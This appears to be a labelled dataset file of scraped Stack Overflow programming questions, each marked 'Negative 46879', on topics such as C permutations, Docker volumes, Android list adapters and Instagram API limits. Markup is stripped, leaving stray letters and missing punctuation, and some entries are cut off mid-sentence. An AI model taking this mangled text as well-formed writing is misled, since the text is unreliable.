Negative 46879 pHow would I write a permutation method in C programming with an array of string characters while each character is being mapped to an integer So for example, I have a permutation of 10 integersp  p1, 0, 2, 3, 5, 4, 6, 9, 8, 7  not necessarily in orderp  pand a text full of characters, less than 400 characters. I have both of them stored into 2 separate arrays, but how would I map each integer onto each character After mapping them, how would I go about writing a method of permutationp  pNeither arrays are the same size. The permutation array has 10 values, the char array has less than 400 chars, but I just initialized it as char text[400] the size of each arrays do not move.p  pBetter explanationp  pI was thinking, if I have 10 integers 0  9 and the following permutation  where each permutation cannot have the same numberp  p0, 1, 2, 3, 4, 5, 6, 7, 8, 9  originalp  p1, 0, 3, 6, 7, 4, 5, 9, 2, 8  permutationp  pApple, bee                    text of 10 characters, including the space and commap  pso by applying the permutation above, I would get something likep  ppAl be,epep  pAnd if you use the inverse of that permutation, you would get Apple, bee again.p  pThe original index[0] is where the A in Apple is supposed to be  and with the permutation, it is switched with the p because of the 1 index... and so on.p  pSo how would I go about implementing that In other words, how would I map the permutation to each char and have it switch positions I havent learned about Structures yet.p

Negative 46879 pIve uploaded a big number of files including their folder structure to my Ubuntu 12.04 LTS Server using WinSCP. The goal is to access these files in Owncloud.p  pHowever, all files that contain special character like German Umlauts cause problems. In Ownclouds view, their name is cut off at the special character and trying to view that folder or file will send you back to the folder root.p  pUsing ls, the special character is always displayed as a question mark, e.g. Moterschweien1.jpg  What works is manually renaming them through mv in the shell. Inserting the special char properly, e.g. Motorschweien1.jpg for this example, does work, but doing this for all of them would take ages.p  pUsing find . name emem will not yield any hits.p  pIs there any way to replace all of those special characters, e.g. with an underscorep

Negative 46879 pIm new to programming, learnt languages but this part I have no clue.  p  pIm working on a app that is on bitbucket and on Heroku cloud.   I am not exactly very clear how the bibucket repository interacts with Heroku and also my local offline commandpromptsublimetextPG database. p  pSo what Im doing is i have made some changes physically on Bitbucket manually on their website based on the changes Ive made and viewed offline on localhost 3000and wanted to push it to Heroku to have the changes online. There does not seem to be any buttons on bitbucket for that purposes and I guess I have to do it through the command prompt. p  pIn that case how do I make those changes command lines and update the sublimePG on the local server I seen a few codes on git and suspect those are it like git push v which lists the repositories but I dont wish to test and end up screwing the codes. Please advise if there are easier to do any of the above.p  p Note that Im want the changes to be on Heroku because of this error. a hrefhttpstackoverflow.comquestions23139291rails4relationshipissueextendedRails 4 Relationship Issue extendedap  pAlso whats the difference between pulling and pushing changes Im reading the git definitions but it isnt saying much. Just that pull is pulling data from other repository to Im not sure where. Push is to update remote refs with associated objects. p  pMany thanks p

Negative 46879 pI am trying to figure out, if it is possible to somehow intercept Google Play application download and put there a file that is already downloaded, to speed up a process. The problem is, that a lot of people will need to download one concrete 40 MB application to their handheld devices over wifi on quite slow connection  2 Mbps, which takes about 2.5 minutes. The idea is to just to make the downloading of one current application much faster, while preserving the ease of application installing via Google Play. If something like this is not easily doable, we will need to buy far more expensive connection. Note that I do not intend to do any hacking.  Hope you got an idea.p  pThe router is not bought yet, so if something particular is needed, it can be chosen and there is a possibility to put there some small Linux server, if needed, for instance for some proxy or so. Could you please provide the best way to make this particular application on one particular wifi cached  Thanksp

Negative 46879 pFirst of all I would like to say that I ve already read all the other questions about Qt and MVC, but I couldnt find what Im looking for. So please, unless you find something in the old questions that actually answer my question, dont link them to me. I also searched in qt.digia.com and qt.project.com but again, no luck.p  pSo now to my problem. I have to implement a simple image comparator that shows to image side by side so that they can be compared. I have to use MVC to do this. My problem is that Ive never used Qt and Im a bit confused on how to use it with MVC. p  pIn particular, I am wondering what MainWindow should be subclassed from. It is the View or the Model, or both This is what I thought. img srchttpi.stack.imgur.comIbw8K.png altenter image description here MainWindow is a View in my class diagram, but Im not sure of that, because it also has elements of a model, since it actually stores data information.

Negative 46879 pI have two toplevel Maven projects, codebackendcode and codefrontendcode, that advance versions at their own individual pace.

Ive also tried setting codesearchReactorcode to codefalsecode for that property in the plugin configuration. It appears that the plugin 1 incorrectly scans the dependencies even when Ive explicitly said to ignore them and 2 even filters out an explicit specific match.p  pIs there a simple way to rewrite a Maven property entry to a specific value, either forcing codeversionsmavenplugincode to do what I say without validating for a version number or by using another goal Id prefer to avoid a tool like codesedcode that doesnt understand XML as Ive seen recommended in a similar question, but I would be okay with a simple XPath manipulation.p

Negative 46879 pGiven an array, I would like to be able to define some relationship between its elements so that each element points to a given number of elements, such that no element should share more than one target element with any other given element of the array.p  pIm pretty sure this can be done easily with some solution from graph theory, but I embarrassingly dont know any graph theory and therefore dont know what Im looking for. The best I can say is that the graph describing the links between elements is regular and directed.p  pThe XY what I actually havewant is twodimensional grid I dont think the dimension is relevant to the math but is very helpful with the visualization, where each cell points to emaroundem 16 flexible on this other cells with a minimum of duplication. The grid is a texture so its anywhere in the 256256 to 40964096 size range, which hopefully doesnt make a significant difference to the algorithm.p  pOnce visualized as a 2D texture, there is an obvious intuitive solution based on image masks, but its totally informal and relies on the implementation details using fewer targets for the purposes of illustrationp  ol lipUsing a regular pattern for the pointedto cells is inappropriatep  pimg srchttpi.imgur.comp5nMQPn.png altImgurp  pThe next cell along will share emsevenem targets with the origin cell red, x. Duplication is guaranteed.pli lipAn irregular broken circle style arrangement intuitively seems like it should workp  pimg srchttpi.imgur.comAXE6buy.png altImgurp  pIf no pair of cells in the group pointedto and origin have an equal difference in position to any other pair of cells in the group, then any given movement of the origin on the grid seems like it shouldnt result in more than one pointedto cell overlapping with any of those highlighted in the original position, and none of the pointedto blue cells should point back to the origin red, x directly it would be nice if they didnt loop back too quickly, either.pli ol  pwrapping around at the edges of the texture is assumedp  pBut this is totally informal and intuitive. I dont have any proof of this and dont know how to go about proving it. Is there an algorithm known from graph theory that can produce such a result, without wishywashy handwaving involving image masks Not least because the intuitive solution, even assuming it works, doesnt provide any guarantees about whether the target cells will loop back to the origin quickly or not, and whether the entire grid or most of it, I dont mind a few unused cells forms a single connected graph, which is absolutely essential.p  pAlternatively, if the broken circle model actually works, how would one go about formalizing this back down to an abstract algorithm operating on a sequence I guess its effectively just an integer sequence, rather than relying on a mask image, which is totally getting confused by implementation details The fact that I want to apply this emtoem a texture should be irrelevantp

Negative 46879 pIve been testing a small Python Bottle web application that uses unicode so I ended up using Python 3 for ease.

I set up a quick test in the two interpreters on my laptop to compare the results I used a number converted to a string because Python seems to optimise repeat data in a listp  precodeclass mybigobject     def initself         self.biglist  []         bignum  123456781234567812345678         for i in range1000000             self.biglist.appendstrbignum             bignum  1         time.sleep10  to give htop time to react to memory usage  def buildmybigobject     bigobj  mybigobject     return Object built codepre  pNow as I understand it when I run buildmybigobject it will create an object called bigobj with a list of numbers as a string 1 million elements long and then destroys the instance when the function ends. This takes my full system memory usage from 319MiB to 384MiB and then back down to 332MiB when the function ends in Python 2.7.p  pIn Python 3.2 it goes from 320MiB to 455MiB and stays there for 23 minutes then down to 446MiB until the interpreter is terminated. This happens on both my dev machine and as a WSGI daemon process on my Apache server. When running through Bottle the memory usage never goes down in Python 3 and just increases in size if the next object instance is larger. Ive tried purposely deleting the instance at the end of the function and using gc.collect with no success. Any ideas on how to deal with thisp

Negative 46879 pIm slowly working my way through understanding current Docker practices. Im on a Mac, and Im using boot2docker. p  pIve been able to use the docker v localdirectorycontainerdirectory method to link a container directory to my local file system. Great, now I can easily edit things like site code in my local Mac file system and have the changes immediately available to my container e.g. varwwwhtml.p  pIm now trying to separate my containers into discrete concerns. For example, a Web, Database, and File e.g. busybox container would be useful for a Wordpress site. Thing is, I dont know how to make my file container define volumes that I can then link to my local OS similar to the v localdirectorycontainerdirectory used by boot2docker.p  pThis is probably not the most eloquent question, as Im still fumbling through learning Docker, but if you can understand what Im trying to achieve, Id really appreciate any guidance provided.p  pThanksp

necessary, making sure that the qty values wont be summed  I need the same number of lines after the sorting.pli lipAfter the sorting is done, I need a script to start analyzing the table, and make a border around each of the same material. Or, if its simpler, analyze from line 1, and, if the following value on the J column of the next line is any different or empty, do a BordersxlEdgeBottom.Weight  xlThickpli ol  pThe VBA script I came up with is the following sorting is not working, it sums up quantities, which is not good, and also sorts by SBin as well somehow.

This view controller has a private property called childViewController, which is an instance of class ChildViewController. The rootViewController has an additional private property called containerView, which is used as a container of the view of childViewController. Lets have a look at the viewDidLoad method of the rootViewControllerp  precode voidviewDidLoad      [super viewDidLoad]      self.containerView  [[UIView alloc] init]     [self.view addSubviewself.containerView]      self.childViewController  [[ChildViewController alloc] initWithNibNamenil bundlenil]     [self addChildViewControllerself.childViewController]     [self.containerView addSubviewself.childViewController.view]     [self.childViewController didMoveToParentViewControllerself]     self.childViewController.view.frame  self.containerView.bounds      self.containerView.backgroundColor  [UIColor purpleColor]     self.childViewController.view.backgroundColor  [UIColor orangeColor]     self.childViewController.childView.backgroundColor  [UIColor yellowColor]  codepre  pNow, lets have a look at the viewWillLayoutSubviews method of the rootViewController to understand the purpose of the mentioned containerView propertyp  precode voidviewWillLayoutSubviews      [super viewWillLayoutSubviews]      CGFloat width     CGFloat height      if UIInterfaceOrientationIsPortrait[UIApplication sharedApplication].statusBarOrientation              width  [UIScreen mainScreen].bounds.size.width         height  roundfwidth  9.0  16.0          else              width  [UIScreen mainScreen].bounds.size.width         height  [UIScreen mainScreen].bounds.size.height           self.containerView.frame  CGRectMake0.0, 0.0, width, height  codepre  pThe containerView is intended to be used as a container for the video player view. So, it has an 169 aspect ratio of the device is in portrait mode. If the device gets rotated into a landscape position, the containerView has to transition into a fullscreen mode. Quite simple, actually. But the problem is, that the childView property of the childViewController gets a size of 0,0, whenever the device gets rotated from the portrait mode into the landscape mode.p  pNow, lets check the implementation of ChildViewControllerp  precodeinterface ChildViewController   property nonatomic, strong UIView childView  end  implementation ChildViewController   voidupdateViewConstraints      [super updateViewConstraints]      NSDictionary views  NSDictionaryOfVariableBindingschildView     NSMutableArray constraints  [NSMutableArray array]      [constraints addObjectsFromArray[NSLayoutConstraint constraintsWithVisualFormatH[childView]                                                                              options0                                                                              metricsnil                                                                                viewsviews]]     [constraints addObjectsFromArray[NSLayoutConstraint constraintsWithVisualFormatV[childView]                                                                              options0                                                                              metricsnil                                                                                viewsviews]]      [self.view removeConstraintsself.view.constraints]     [self.view addConstraintsconstraints]    voidviewDidLoad      [super viewDidLoad]      self.childView  [[UIView alloc] init]     self.childView.translatesAutoresizingMaskIntoConstraints  NO     [self.view addSubviewself.childView]   end  codepre  pSo, I have created constraints for the property childView, to use the whole area of its superview. Unfortunately, this view gets resized to 0,0, which actually should not be possible with the constrains added to its superview.p  pYou can find the sample project here a hrefhttpswww.dropbox.coms0yr1j7awi6hhhbtAutolayout.zipdl0 relnofollowhttpswww.dropbox.coms0yr1j7awi6hhhbtAutolayout.zipdl0ap  pstrongEDITstrongp  pI found the reason for the issue. Trying to remove existing constraints with a statement likep  precode[self.view removeConstraintsself.view.constraints] codepre  pseems to be a very bad idea, because self.view.constraints doesnt seem to contain only the constraints created in the implementation of updateViewConstraints. So, it also contains additional constraints, which seem to be created by the system and removing these results in a weird behavior. That means, you have to store all constraints, which you may want to remove later as updating the existing constraints, in a special array.p

Negative 46879 pSo Ive been making board game Funny Bunny childrens game on Java. I first made it text based but now Ive been building a GUI for it using Swing. The trouble is, Ive never made a GUI before and tough the GUI itself has been fairly easy to make, I find it incredibly hard to combine my game and the GUI.p  pIll first explain the basic idea of the game.p  pTHE GAMEp  ul liThere are 24 players and they all have four game pieces.li lipTheres a deck of special card that run the game 4 types move 1, 2 or 3 steps and card for changing the board.pli lipOne turn consists of player revealing a cardp  blockquote   pIf its a move card, the move a piece   If its change the board card, the board changes and holes may open. Some places on the board arent safe, game pieces might drop in a holep blockquoteli ul  pSo, the idea behind the game is fairly simple.p  pstrongThe trouble, Ive got no idea how to actually make it work with a GUI.strong I tought itd be rather and started enthuastically building my GUI.

Based on the type of the card enter either stage  3.1 Move a game piece. This would happen by clicking a game piece either button on the side or a piece on the game board  This would start move a piece process  Requires updating the board in the end OR 3.2 Change the board, which would updating the GUI board. strongIm really lost with how to do this.strongp  pShould I use something like threads, or Swing Worker or what should I do Do you people want to see some sample code Thatd probably help.

Negative 46879 pIm trying to solve the following problem Given a sorted increasing order array with unique integer elements, write an algorithm to create a BST with minimal height.p  pThe given answer takes the root node to be the middle of the array. While doing this makes sense to me intuitively, Im trying to prove, rigorously, that its always best to make the root node the middle of the array. p  pThe justification given in the book is To create a tree of minimal height, we need to match the number of nodes in the left subtree to the number of nodes in the right subtree as much as possible. This means that we want the root node to be the middle of the array, since this would mean that half the elements would be less than the root and half would be greater.p  pId like to askp  ol lipWhy would any tree of minimal height be one where the number of nodes in the left subtree be as equal as possible to the number of nodes in the right subtree Or, do you have any other way to prove that its best to make the root node the middle of the arraypli lipIs a tree with minimal height the same as a tree thats balanced From a previous question on SO, thats the impression I got, a hrefhttpstackoverflow.comquestions29324245visualizingabalancedtree2932430429324304Visualizing a balanced treea but Im confused because the book specifically states BST with minimal height and never balanced BST.pli ol  pThanks.p  pSource Cracking the Coding Interviewp

Negative 46879 pI am building a Java application on the Equinox OSGi framework and I have been using DS declarative services to declare referenced and provided services. So far all the service consumers I have implemented happened to be service providers as well, so it was natural for me to make them stateless so that they can be reused by multiple consumers, rather than being attached to one consumer and let them be instantiated by the framework default constructor, invoked nowhere in my code.p  pNow I have a different situation I have a class codeMyClasscode that references a service codeMyServicecode but is not itself a service provider. I need to be able to instantiate codeMyClasscode myself, rather than letting the OSGi framework instantiate it. I would then want the framework to pass the existing codeMyServicecode instance to the codeMyClasscode instances. Something like thisp  pre classlangjava prettyprintoverridecodepublic class MyClass       private String myString     private int myInt      private MyService myService      public MyClassString myString, int myInt          this.myString  myString         this.myInt myInt            bind     private void setMyServiceMyService myService          this.myService  myService            unbind     private void unsetMyServiceMyService myService          this.myService  null           public void doStuff          if myService  null              myService.doTheStuff          else               Some fallback mechanism                 codepre  pre classlangjava prettyprintoverridecodepublic class AnotherClass       public void doSomethingString myString, int myInt          MyClass myClass  new MyClassmyString, myInt           At this point I would want the OSGi framework to invoke          the setMyService method of myClass with an instance of          MyService, if available.          myClass.doStuff        codepre  pMy first attempt was to use DS to create a component definition for codeMyClasscode and reference codeMyServicecode from therep  pre classlangxml prettyprintoverridecodeltscrcomponent xmlnsscrhttpwww.osgi.orgxmlnsscrv1.1.0 nameMy Classgt     ltimplementation classmy.package.MyClassgt     ltreference bindsetMyService cardinality0..1 interfacemy.other.package.MyService nameMyService policystatic unbindunsetMyServicegt ltscrcomponentgt codepre  pHowever, codeMyClasscode is not really a component, since I dont want its lifecycle to be managed  I want to take care of instantiation myself. As a hrefhttpstackoverflow.comusers318921neilbartlettNeil Bartletta points out a hrefhttpstackoverflow.coma8887216285091hereap  blockquote   pFor example you could say that your component depends on a   particular service, in which case the component will only be created   and activated when that service is available  and also it will be   destroyed when the service becomes unavailable.p blockquote  pThis is not what I want. I want the binding without the lifecycle management.

Negative 46879 pI have injected a DLL into an external application that is based on the QT framework. I then use the command QApplicationallWidgets and iterate through the list of widgets to find a QGraphicsView that represents the window I want to interact with. The buttons and other controls in the scene are all derived from QGraphicsObject. I dont have the source, so I can only cast to QGraphicsObject and not the actual type. The list of methods from the metaobject is incomplete, which is to be expected, because I cast to a QGraphicsObject. I can find the method names using IDA though. Is it possible to call a particular method, and how would you do itp

Negative 46879 pIve tried to implement the recycling that is advised, as you can see in the code below. The reason is that the ListView lagged when scrolling and recycling the Views is what solved it. However it also caused another problem, which is that the images that are loaded in the ListView items are loaded incorrectly. There are some views that do not have an image and some that do. When going over the ones that do not have an image the UIL sometimes does load a picture of a different item. Also when I keep scrolling up and down the other items without an image get an image attributed to them.p  pThis is the custom ListViewAdapterp  precodepublic class CarListViewAdapter extends BaseAdapter    Declare Variables Context context String[] name String[] owner String[] imageUrl String[] pricePerKm String[] pricePerH int amount int screenWidth  ViewHolder viewHolder  ImageLoader imageLoader DisplayImageOptions options  public CarListViewAdapterContext context, String[] imageUrl, String[] name, String[] owner,                           String[] pricePerKm, String[] pricePerH, int amount, int screenWidth      this.context  context     this.name  name     this.owner  owner     this.imageUrl  imageUrl     this.pricePerKm  pricePerKm     this.pricePerH  pricePerH     this.amount  amount     this.screenWidth  screenWidth      options  new DisplayImageOptions.Builder             .cacheOnDisktrue             .cacheInMemorytrue             .bitmapConfigBitmap.Config.RGB565             .imageScaleTypeImageScaleType.EXACTLY             .resetViewBeforeLoadingtrue             .build     ImageLoaderConfiguration config  new ImageLoaderConfiguration.Buildercontext             .defaultDisplayImageOptionsoptions             .threadPriorityThread.MAXPRIORITY             .threadPoolSize5             .diskCacheExtraOptionsscreenWidth, Math.roundscreenWidth  2, null             .memoryCachenew WeakMemoryCache             .denyCacheImageMultipleSizesInMemory             .build     imageLoader  ImageLoader.getInstance     imageLoader.initconfig   static class ViewHolder      ImageView image     TextView nameText     TextView ownerText     TextView pricePerKmText     TextView pricePerHText   public View getViewint position, View convertView, ViewGroup parent      if convertView  null          LayoutInflater inflater  LayoutInflater context.getSystemServiceContext.LAYOUTINFLATERSERVICE         convertView  inflater.inflateR.layout.carlist, parent, false                       viewHolder  new ViewHolder     viewHolder.image  ImageView convertView.findViewByIdR.id.carimage     viewHolder.nameText  TextView convertView.findViewByIdR.id.carname     viewHolder.ownerText  TextView convertView.findViewByIdR.id.carowner     viewHolder.pricePerKmText  TextView convertView.findViewByIdR.id.carpricekm     viewHolder.pricePerHText  TextView convertView.findViewByIdR.id.carpriceh      viewHolder.image.getLayoutParams.width  screenWidth     viewHolder.image.getLayoutParams.height  Math.roundscreenWidth  2     viewHolder.image.requestLayout      if imageUrl[position]  null          imageLoader.displayImageimageUrl[position], viewHolder.image           viewHolder.nameText.setTextname[position]     viewHolder.ownerText.setTextowner[position]     viewHolder.pricePerKmText.setTextpricePerKm[position]     viewHolder.pricePerHText.setTextpricePerH[position]      return convertView    Override public int getCount      return amount   Override public Object getItemint position      return null   Override public long getItemIdint position      return 0  codepre

Negative 46879 pI am working on an Application to processes Company resources. We have a MS SQL Database and are working with EntityFramework 6.1.3 and .Net4.5. Now DbContext has async methods for examplep  precodeprotected Taskltintgt SaveChangesAsync codepre  pI know that DbContext is NOT Thread safe and I dont want to actually call Async operations with the intend that they will be executed parallel. But I need to free up my GUI thread while polling the database.p  pNormally you would go and programm with await keywords and just be carefull not to call 2 Async operations at the same time BUT the application is supposed to be always uptodate. Therefor we have a server connection. Now everytime some other user updates the database a polling command is sent to all Applications that are currently working on this database. This polling command could be anytime and would therefor be a racecondition with any user initiated async polling of the database.p  pWhat I want to do is queue each Task after the previous one.

Negative 46879 pI am developing an Android Device Management Enterprise application. One of the requirements given to me was to block all the applications on the device Tablets from using cellular data except the applications installed by the organisation. The devices may have Lollipop or lower versions and there are approximately 100,000 devices so, rooting them is not preferredalmost impossible. I have looked up on the internet regarding this and a nonroot solution I found was to use the VPN service provided by Android. p  pMy idea is to have a VPN server like openVpn and have some restrictions firewall that block certain urls. I am not sure if this is a viable solution considering that the devices use cellular data in rural areas of India and the network is not exactly super strong and connecting to the VPN server every time would be extra load. I would like to understand if there are better ways to restrict apps from using data.p

Negative 46879 pIm working on a system whose endusers are small and medium business owners. The goal of this feature is to get pictures in realtime that others post to Instagram that are tagged with their business location. Note that this is different from pictures that are tagged with the business account ie we want a hrefhttpsinstagram.comexplorelocations237630908 relnofollowthis feeda, not a hrefhttpsinstagram.comaydenkitchenbar relnofollowthis feeda.p  pI was planning on using the realtime subscriptions system documented a hrefhttpsinstagram.comdeveloperrealtime relnofollowherea since it explains we can subscribe to a location ID and receive notifications about new media at that location. We rolled it out and immediately started failing because there is an unpublished limit of 30 subscriptions I guess we should have done more googling before starting to build it.p  pThis is basically the same problem outlined a hrefhttpstackoverflow.comquestions14065950instagramapirealtimelimitherea but that conversation is really stale and Im not sure the end goal is exactly the same since the proposed solutions wont help me.p  pThere are way too many customer accounts to register more applications to get enough subscriptions we would have to register thousands of apps. We were hoping that we could use an Instagram users access token obtained through an Oauth2 workflow to create more subscriptions, but my experiments with that havent panned out either. I know other people have used large geographic area subscriptions instead of location subscriptions, but this wont scale large enough for us either.p  pIm frustrated and confused by this problem becausep  ol liIt seems that other applications are getting these pictures in realtime at a scale that wouldnt fit the limit of 30 subscriptions.li liI cant imagine many use cases were 30 subscriptions per application would be a useful feature.li ol  pDoes anyone have a workaround Is there a way to use the Instagram User credentials instead of Application credentials Will I have to resort to polling the location feed regularly and ditch my realtime aspirationsp
